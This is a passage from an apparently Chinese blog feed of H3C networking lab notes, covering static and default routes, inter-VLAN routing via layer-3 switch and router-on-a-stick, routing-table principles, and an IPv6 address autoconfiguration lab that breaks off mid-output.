        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E5%AE%9E%E9%AA%8C/01.jpg"></p><blockquote><p>注：如无特别说明，描述中的 R1 或 SW1 对应拓扑中设备名称末尾数字为 1 的设备，R2 或 SW2 对应拓扑中设备名称末尾数字为 2 的设备，以此类推；另外，同一网段中，IP 地址的主机位为其设备编号，如 R3 的 g0&#x2F;0 接口若在 <code>192.168.1.0/24</code> 网段，则其 IP 地址为 <code>192.168.1.3/24</code>，以此类推</p></blockquote><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示配置 IP 地址</p><p>2.按照如下路径规划配置静态路由，实现连接 PC 的业务网段互通</p><ul><li><p>i.<code>192.168.1.0/24</code> 网段到达 <code>192.168.2.0/24</code> 网段经过 R1，R2，R3</p></li><li><p>ii.<code>192.168.2.0/24</code> 网段到达 <code>192.168.1.0/24</code> 网段经过 R3，R4，R1</p></li><li><p>iii.<code>192.168.1.0/24</code> 网段到达 <code>192.168.3.0/24</code> 网段经过 R1，R4，R5</p></li><li><p>iv.<code>192.168.2.0/24</code> 网段到达 <code>192.168.3.0/24</code> 网段经过 R3，R4，R5</p></li><li><p>v.<code>192.168.3.0/24</code> 网段到达 <code>192.168.1.0/24</code> 网段和 <code>192.168.2.0/24</code> 网段的路由来回一致</p></li><li><p>vi.R5 上不允许出现到达其他业务网段的明细路由</p></li><li><p>vii.所有经过 R4 和 R5 的流量通过等价路由实现负载分担</p></li></ul><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>配置 IP 地址部分略</strong></p><p>2.按照需求配置静态路由，实现连接 PC 的业务网段互通</p><p>　　<em>分析：配置静态路由时，首先要明确一点，是要求全网互通，还是只要求业务网段互通。如果是只要求业务网段互通的话，就只需要配置到达业务网段的静态路由，并不需要配置到达途径的互联网段的静态路由<br>　　根据这个思路，就可以得知，只需要按照规划的路径，使沿途每台路由器上具有到达目的业务网段的路由就可以了<br>　　另外，对于某些路由器，某些业务网段是其直连网段，路由器会自动产生相应的直连路由，并不需要再额外配置静态路由</em><br>　　<br><em>步骤 1：配置 <code>192.168.1.0/24</code> 网段到 <code>192.168.2.0</code> 网段的静态路由</em></p><p>　　<em>分析：目的网段是 <code>192.168.2.0/24</code> 网段，需要经过 R1，R2，R3，在 R1 上需要配置静态路由，下一跳指向 R2 ，R2 上也需要配置静态路由，下一跳指向 R3，R3 上会自动产生到达 <code>192.168.2.0/24</code> 网段的直连路由，不需要额外配置</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 192.168.2.0 24 10.2.2.2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R2]ip route-static 192.168.2.0 24 10.3.3.3</span><br></pre></td></tr></table></figure><p><em>步骤 2：配置 <code>192.168.2.0/24</code> 网段到 <code>192.168.1.0</code> 网段的静态路由</em></p><p>　　<em>分析：目的网段是 <code>192.168.1.0/24</code> 网段，需要经过 R3，R4，R1，在 R3 上需要配置静态路由，下一跳指向 R4 ，R4 上也需要配置静态路由，下一跳指向 R1，R1 上会自动产生到达 <code>192.168.1.0/24</code> 网段的直连路由，不需要额外配置</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R3]ip route-static 192.168.1.0 24 10.4.4.4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R4]ip route-static 192.168.1.0 24 10.1.1.1</span><br></pre></td></tr></table></figure><p><em>步骤 3：配置 <code>192.168.1.0/24</code> 网段到 <code>192.168.3.0</code> 网段的静态路由</em></p><p>　　<em>分析：目的网段是 <code>192.168.3.0/24</code> 网段，需要经过 R1，R4，R5，在 R1 上需要配置静态路由，下一跳指向 R4 ，R4 上也需要配置静态路由，下一跳指向 R5，且 R4 到 R5 之间要求有等价路由，R5 上会自动产生到达 <code>192.168.3.0/24</code> 网段的直连路由，不需要额外配置</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 192.168.3.0 24 10.1.1.4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R4]ip route-static 192.168.3.0 24 10.5.5.5</span><br><span class="line">[R4]ip route-static 192.168.3.0 24 10.6.6.5</span><br></pre></td></tr></table></figure><p><em>步骤 4：配置 <code>192.168.2.0/24</code> 网段到 <code>192.168.3.0</code> 网段的静态路由</em></p><p>　　<em>分析：目的网段是 <code>192.168.3.0/24</code> 网段，需要经过 R3，R4，R5，在 R3 上需要配置静态路由，下一跳指向 R4 ，R4 在上一步已经配置过了，无需再次配置，R5 上会自动产生到达 <code>192.168.3.0/24</code> 网段的直连路由，不需要额外配置</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R3]ip route-static 192.168.3.0 24 10.4.4.4</span><br></pre></td></tr></table></figure><p><em>步骤 5：配置 <code>192.168.3.0/24</code> 网段到 <code>192.168.1.0</code> 网段的静态路由</em></p><p>　　<em>分析：目的网段是 <code>192.168.1.0/24</code> 网段，要求来回路径一致，就是要经过 R5，R4，R1，在 R5 上需要配置静态路由，下一跳指向 R4 ，但又不允许出现明细路由，那么只能通过默认路由来实现，而且 R5 到 R4 上需求有等价路由，R4 在步骤 2 已经配置过了到达 <code>192.168.1.0/24</code> 网段的路由，不需要再次配置，R1 上会自动产生到达 <code>192.168.1.0/24</code> 网段的直连路由，也不需要额外配置</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R5]ip route-static 0.0.0.0 0 10.5.5.4</span><br><span class="line">[R5]ip route-static 0.0.0.0 0 10.6.6.4</span><br></pre></td></tr></table></figure><p><em>步骤 6：配置 <code>192.168.3.0/24</code> 网段到 <code>192.168.2.0</code> 网段的静态路由</em></p><p>　　<em>分析：目的网段是 <code>192.168.2.0/24</code> 网段，要求来回路径一致，就是要经过 R5，R4，R3，R5 在上一步已经配置过了默认路由，不需要再次配置，R4 需要配置静态路由，下一跳指向 R3，R3 上会自动产生到达 <code>192.168.3.0/24</code> 网段的直连路由，也不需要额外配置</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R4]ip route-static 192.168.2.0 24 10.4.4.3</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三层交换实验</title>
      <link href="/posts/45786"/>
      <url>/posts/45786</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><blockquote><p>注：如无特别说明，描述中的 R1 或 SW1 对应拓扑中设备名称末尾数字为 1 的设备，R2 或 SW2 对应拓扑中设备名称末尾数字为 2 的设备，以此类推</p></blockquote><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示为 PC2 和 PC3 配置 IP 地址和网关</p><p>2.PC2 属于 Vlan10，PC3 属于 Vlan20，在三层交换机上配置 Vlanif 三层接口实现 Vlan10 和 Vlan20 三层互通</p><p>3.PC2 和 PC3 可以互通</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>PC 配置 IP 地址部分略</strong></p><p>2.<strong>PC2 属于 Vlan10，PC3 属于 Vlan20，在三层交换机上配置 Vlanif 三层接口实现 Vlan10 和 Vlan20 三层互通</strong></p><p>　　<em>分析：在三层交换机上实现 Vlan 间的路由互通，只需要对每个 Vlan 开启 Vlanif 三层接口，并配置对应网段的网关地址就可以了</em></p><p><em>步骤 1：在 SW1 上创建 Vlan10 和 Vlan20，并把 g1&#x2F;0&#x2F;1 接口加入 Vlan10，把 g1&#x2F;0&#x2F;2 接口加入 Vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]vlan 10</span><br><span class="line">[SW1-vlan10]port g1/0/1</span><br><span class="line">[SW1-vlan10]vlan 20</span><br><span class="line">[SW1-vlan20]port g1/0/2</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW1 上对 Vlan10 和 Vlan20 开启 Vlanif 接口，并配置 Vlanif10 接口 IP 地址为 Vlan10 的网关地址 <code>192.168.1.254/24</code>，配置 Vlanif20 接口 IP 地址为 Vlan20 的网关地址 <code>192.168.2.254/24</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface Vlan-interface 10</span><br><span class="line">[SW1-Vlan-interface10]ip address 192.168.1.254 24</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface Vlan-interface 20</span><br><span class="line">[SW1-Vlan-interface20]ip address 192.168.2.254 24</span><br></pre></td></tr></table></figure><p>　　<em>分析：配置结束后，在 SW1 上查看路由表，会发现已经产生了到达<code>192.168.1.0/24</code>网段和<code>192.168.2.0/24</code>网段的直连路由，出接口分别指向各自 Vlanif 接口，证明 SW1 已经可以对 Vlan10 和 Vlan20 间的数据进行三层转发了</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[SW1]display ip routing-table </span><br><span class="line"></span><br><span class="line">Destinations : 16       Routes : 16</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">……</span><br><span class="line">192.168.1.0/24     Direct  0   0           192.168.1.254   Vlan10</span><br><span class="line">……</span><br><span class="line">192.168.2.0/24     Direct  0   0           192.168.2.254   Vlan20</span><br></pre></td></tr></table></figure><p>3.<strong>测试在 PC3 上 Ping PC4 ，可以 Ping 通 PC4</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 192.168.2.1</span><br><span class="line">Ping 192.168.2.1 (192.168.2.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=0 ttl=254 time=36.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=1 ttl=254 time=25.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=2 ttl=254 time=27.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=3 ttl=254 time=29.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=4 ttl=254 time=39.000 ms</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单臂路由实验</title>
      <link href="/posts/33995"/>
      <url>/posts/33995</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><blockquote><p>注：如无特别说明，描述中的 R1 或 SW1 对应拓扑中设备名称末尾数字为 1 的设备，R2 或 SW2 对应拓扑中设备名称末尾数字为 2 的设备，以此类推</p></blockquote><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示为 PC3 和 PC4 配置 IP 地址和网关</p><p>2.PC3 属于 Vlan10，PC4 属于 Vlan20，配置单臂路由实现 Vlan10 和 Vlan20 三层互通</p><p>3.PC3 和 PC4 可以互通</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>PC 配置 IP 地址部分略</strong></p><p>2.<strong>PC3 属于 Vlan10，PC4 属于 Vlan20，配置单臂路由实现 Vlan10 和 Vlan20 三层互通</strong></p><p>　　<em>分析：用单臂路由实现 Vlan 间三层互通，需要把 SW2 连接 R1 的接口配置为 Trunk，并允许 Vlan10 和 Vlan20 通过<br>　　R1 连接 SW2 的接口上要开启子接口，分别作为 Vlan10 和 Vlan20 的网关。这里规划 g0&#x2F;0.1 子接口作为 Vlan10 的网关，IP 地址就是<code>192.168.1.254/24</code>，g0&#x2F;0.2 子接口作为 Vlan20 的网关，IP 地址就是<code>192.168.2.254/24</code><br>　　R1 的子接口上为了能够识别 SW2 的 Trunk 端口发送的 802.1Q 帧，还需要开启 dot1q 识别并绑定相应 Vlan。根据上述分析，g0&#x2F;0.1 子接口绑定 Vlan10，g0&#x2F;0.2 子接口绑定 Vlan20</em><br>　　<br><em>步骤 1：在 SW2 上创建 Vlan10 和 Vlan20，并把 g1&#x2F;0&#x2F;1 接口加入 Vlan10，把 g1&#x2F;0&#x2F;2 接口加入 Vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW2]vlan 10</span><br><span class="line">[SW2-vlan10]port g1/0/1</span><br><span class="line">[SW2-vlan10]vlan 20</span><br><span class="line">[SW2-vlan20]port g1/0/2</span><br></pre></td></tr></table></figure><p><em>步骤 2：把 SW2 的 g1&#x2F;0&#x2F;3 接口配置为 Trunk，并允许 Vlan10 和 Vlan20 通过</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]interface g1/0/3</span><br><span class="line">[SW2-GigabitEthernet1/0/3]port link-type trunk</span><br><span class="line">[SW2-GigabitEthernet1/0/3]port trunk permit vlan 10 20</span><br></pre></td></tr></table></figure><p><em>步骤 3：在 R1 上创建子接口 g0&#x2F;0.1，开启 dot1q 识别，绑定到 Vlan10，并配置 IP 地址 <code>192.168.1.254/24</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]interface g0/0.1</span><br><span class="line">[R1-GigabitEthernet0/0.1]vlan-type dot1q vid 10</span><br><span class="line">[R1-GigabitEthernet0/0.1]ip address 192.168.1.254 24</span><br></pre></td></tr></table></figure><p><em>步骤 4：在 R1 上创建子接口 0&#x2F;0.2，开启 dot1q 识别，绑定到 Vlan20，并配置 IP 地址<code>192.168.2.254/24</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]interface g0/0.2</span><br><span class="line">[R1-GigabitEthernet0/0.2]vlan-type dot1q vid 20</span><br><span class="line">[R1-GigabitEthernet0/0.2]ip address 192.168.2.254 24</span><br></pre></td></tr></table></figure><p>　　<em>分析：配置结束后，在 R1 上查看路由表，会发现已经产生了到达<code>192.168.1.0/24</code>网段和<code>192.168.2.0/24</code>网段的直连路由，出接口分别指向各自子接口，证明路由器已经可以对 Vlan10 和 Vlan20 间的数据进行三层转发了</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[R1]display ip routing-table </span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">……</span><br><span class="line">192.168.1.0/24     Direct  0   0           192.168.1.254   GE0/0.1</span><br><span class="line">……</span><br><span class="line">192.168.2.0/24     Direct  0   0           192.168.2.254   GE0/0.2</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>3.<strong>测试在 PC3 上 Ping PC4 ，可以 Ping 通 PC4</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 192.168.2.1</span><br><span class="line">Ping 192.168.2.1 (192.168.2.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=0 ttl=254 time=36.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=1 ttl=254 time=25.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=2 ttl=254 time=27.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=3 ttl=254 time=29.000 ms</span><br><span class="line">56 bytes from 192.168.2.1: icmp_seq=4 ttl=254 time=39.000 ms</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>直连路由和静态路由</title>
      <link href="/posts/21011"/>
      <url>/posts/21011</url>
      
        <content type="html"><![CDATA[<br /><br /><br /><h3 id="VLAN间路由"><a href="#VLAN间路由" class="headerlink" title="VLAN间路由"></a>VLAN间路由</h3><h4 id="定义-："><a href="#定义-：" class="headerlink" title="定义  ："></a><em>定义</em>  ：</h4><p><code>指导设备对不同Vlan间进行三层数据转发</code></p><h4 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a><em>实现方法</em>：</h4><p>单臂路由</p><ul><li><code>交换机上划分多个VLAN</code></li><li><code>路由器单线连接到交换机</code><ul><li><code>路由器接口划分若干子接口，子接口的IP为下连vlan网关，并绑定相应vlan</code></li><li><code>交换机接口     配置Trunk，允许所有vlan通过</code></li></ul></li></ul><p>三层交换</p><ul><li><code>三层交换机上启用vlanif三层接口，配置为网关IP</code></li><li><code>自动产生到达所有vlan的直连路由</code></li><li><code>对比路由器的优势</code><ul><li><code>转发效率高</code></li><li><code>接口数量大</code></li></ul></li></ul><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>[h3c]interface &#39;sub-interface&#39;创建子接口，进入子接口视图</code></p><p><code>[h3c-GigabltEthernet0/0]vlan-type dot1g vid &#39;vlan-id&#39;子接口开启802.1Q识别，并绑定Vlan</code></p><p><code>[h3c]interface vlan-interface &#39;vlan-id&#39;创建Vlanif三层接口，进入Vlanif接口视图</code></p><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><h4 id="配置要点"><a href="#配置要点" class="headerlink" title="配置要点"></a>配置要点</h4><ul><li><code>如下一跳所在接口是点到点接口，可以以指出接口的方式来配置静态路由</code></li><li><code>如下一跳所在接口是以太网接口，只能以指下一跳来配置静态路由</code></li></ul><h4 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h4><ul><li><code>目的网段为0.0.0.0/0</code></li><li><code>当数据包在路由表中匹配不到明细路由时，按照默认路由转发</code></li></ul><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>[h3c]ip route-static &#39;network&#39; &#39;mask&#39; &#39;nexthop/interface&#39;配置静态路由</code></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP路由原理</title>
      <link href="/posts/14298"/>
      <url>/posts/14298</url>
      
        <content type="html"><![CDATA[<br /><br /><p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E6%97%A0%E9%97%AE%E8%A5%BF%E4%B8%9C01.jpg"></p><h2 id="IP路由原理"><a href="#IP路由原理" class="headerlink" title="IP路由原理"></a>IP路由原理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><code>路由器负责将数据报文在IP网段之间进行转发</code></li><li><code>路由是指导路由器如何进行数据转发的路径信息</code></li></ul><h3 id="IP连通的前提"><a href="#IP连通的前提" class="headerlink" title="IP连通的前提"></a>IP连通的前提</h3><ul><li><strong><code>沿途的每台路由器上都有到达目的网段的路由信息</code></strong></li><li><strong><code>路由是单向的路径信息，沿途每台路由器都要有往返双向路由信息</code></strong></li></ul><h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><p><em><strong>作用</strong></em><code>存储路由信息</code></p><p><em><strong>字段内容</strong></em></p><ul><li>Destination&#x2F;mask<code>目的网段/掩码</code></li><li>Proto<code>路由的来源</code></li><li>Cost<code>度量值</code></li><li>Nexthop<code>下一跳地址数据报文从接口发出后到达的下一个IP地址</code></li><li>Interface <code>出接口数据报文发出的接口</code></li></ul><p><em><strong>路由表查表规则</strong></em></p><ul><li><em>最长掩码匹配规则:</em><ul><li><strong><code>当数据包在路由表中匹配到多条掩码长度不同的路由，会按照掩码最长的路由进行转发，掩码长范围小</code></strong></li></ul></li><li><em>路由迭代规则:</em><ul><li><strong><code>当路由的下一跳为非直连网段地址，路由器会再次在路由表中查询下一跳地址，直到查询到下一跳是直连地址为止</code></strong></li></ul></li></ul><p><em><strong>来源</strong></em></p><ul><li><em>直连路由</em><ul><li>定义：<code>根据直连接口所在网段自动产生</code></li><li>产生条件：<code>接口UP，接口配置IP地址</code></li></ul></li><li><em>静态路由</em><ul><li>定义：<code>手动配置到达每个目的网段的路由信息</code></li><li>特点：<code>配置和维护繁琐复杂。没有路由协议消耗，减轻设备和带宽压力</code></li></ul></li><li><em>动态路由协议</em><ul><li>定义：<code>通过路由协议从邻居自动学习路由信息</code></li><li>特点：<code>配置简单，维护便捷。协议会消耗设备资源和链路资源</code></li><li>常见路由协议：<ul><li>RIP<code>路由信息协议，年代久远，已经被淘汰</code></li><li>OSPF       <code>开放式最短路径优先，目前最主流的路由协议</code></li><li>BGP        <code>边界网关协议，运营商之间使用的唯一协议</code></li><li>IS-IS</li></ul></li></ul></li></ul><p><em><strong>路由表写表规则</strong></em></p><ul><li><code>1.不同来源的路由优先级高（数字小）的优先</code></li><li><code>2.同一来源的路由Cost小的优先</code></li><li><code>3.同一来源Cost相等的路由会形成等价路由</code></li></ul><p><em><strong>路由优先级</strong></em></p><ul><li><code>直连路由（Direct）0</code>  <code>不可更改</code></li><li><code>OSPF内部路由10</code></li><li><code>静态路由60</code></li><li><code>RIP100</code></li><li><code>OSPF外部路由150</code></li><li><code>BGP255</code></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><code>[h3c]display ip routing-table</code><em>查看路由表</em></p><p><code>[h3c]display ip routing-table &#39;network&#39; &#39;mask&#39;</code><em>查看指定网段的路由信息</em></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6实验</title>
      <link href="/posts/385"/>
      <url>/posts/385</url>
      
        <content type="html"><![CDATA[<p><br /><br /></p><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/IPv6%E5%AE%9E%E9%AA%8C/01.jpg"></p><p><em>基于模拟器自身原因，本实验PC3使用路由器模拟</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>​<em>1.在R1和PC3上开启IPv6链路本地地址自动生成，测试是否能够使用链路本地地址互通</em></p><p>​<em>2.为R1配置全球单播地址2001::1&#x2F;64，使PC3能够自动生成与R1同一网段的IPv6地址</em></p><p>​<em>3.测试R1和PC3是否能够使用全球单播地址互通</em></p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>​1.<strong>在R1和PC3上开启IPv6链路本地地址自动生成，测试是否能够使用链路本地地址互通</strong></p><p>　　<em>分析：路由器需要手动开启链路本地地址自动生成，该功能PC默认会开启。但由于这里使用路由器来模拟PC3，所以PC上也需要开启</em></p><p><em>步骤1：在R1的g0&#x2F;0接口上开启IPv6链路本地地址自动生成</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]interface g0/0</span><br><span class="line">[R1-GigabitEthernet0/0]ipv6 address auto </span><br></pre></td></tr></table></figure><p><em>步骤2：在R1上查看g0&#x2F;0接口的IPv6信息，发现已经生成了前缀为<code>FE80</code>的IPv6地址，该地址属于链路本地地址</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R1]display ipv6 interface g0/0</span><br><span class="line">GigabitEthernet0/0 current state: UP</span><br><span class="line">Line protocol current state: UP</span><br><span class="line">IPv6 is enabled, link-local address is FE80::7C9F:E8FF:FE51:105</span><br><span class="line">No global unicast address configured</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p><em>步骤3：PC3上开启IPv6链路本地地址自动生成和查看地址命令和R1一致，此处省略</em></p><p><em>步骤4：在PC3上Ping R1的IPv6链路本地地址，发现可以Ping通</em></p><p>　　<em>注意：在路由器上Ping ipv6链路本地地址，需要指定出接口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[PC3]ping ipv6 -i g0/0 FE80::7C9F:E8FF:FE51:105</span><br><span class="line">Ping6(56 data bytes) FE80::824C:A1FF:FE05:305 --&gt; FE80::7C9F:E8FF:FE51:105, press CTRL_C to break</span><br><span class="line">56 bytes from FE80::7C9F:E8FF:FE51:105, icmp_seq=0 hlim=64 time=160.000 ms</span><br><span class="line">56 bytes from FE80::7C9F:E8FF:FE51:105, icmp_seq=1 hlim=64 time=29.000 ms</span><br><span class="line">56 bytes from FE80::7C9F:E8FF:FE51:105, icmp_seq=2 hlim=64 time=80.000 ms</span><br><span class="line">56 bytes from FE80::7C9F:E8FF:FE51:105, icmp_seq=3 hlim=64 time=39.000 ms</span><br><span class="line">56 bytes from FE80::7C9F:E8FF:FE51:105, icmp_seq=4 hlim=64 time=20.000 ms</span><br></pre></td></tr></table></figure><p>​2.<strong>为R1配置全球单播地址2001::1&#x2F;64，使PC3能够自动生成与R1同一网段的IPv6地址</strong></p><p>　　<em>分析：IPv6全球单播地址的自动生成不需要依靠DHCP服务，只需要网段内的路由器具有全球单播地址，并且解除RA消息抑制即可</em></p><p><em>步骤1：在R1的g0&#x2F;0接口上配置IPv6全球单播地址<code>2001::/64</code>，并解除RA消息抑制</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]interface g0/0</span><br><span class="line">[R1-GigabitEthernet0/0]ipv6 address 2001::1 64</span><br><span class="line">[R1-GigabitEthernet0/0]undo ipv6 nd ra halt</span><br></pre></td></tr></table></figure><p><em>步骤2：在PC3上查看结果</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[PC3]display ipv6 interface g0/0</span><br><span class="line">GigabitEthernet0/0 current state: UP</span><br><span class="line">Line protocol current state: UP</span><br><span class="line">IPv6 is enabled, link-local address is FE80::824C:A1FF:FE05:305</span><br><span class="line">　Global unicast address(es):</span><br><span class="line">　　2001::824C:A1FF:FE05:305, subnet is 2001::/64 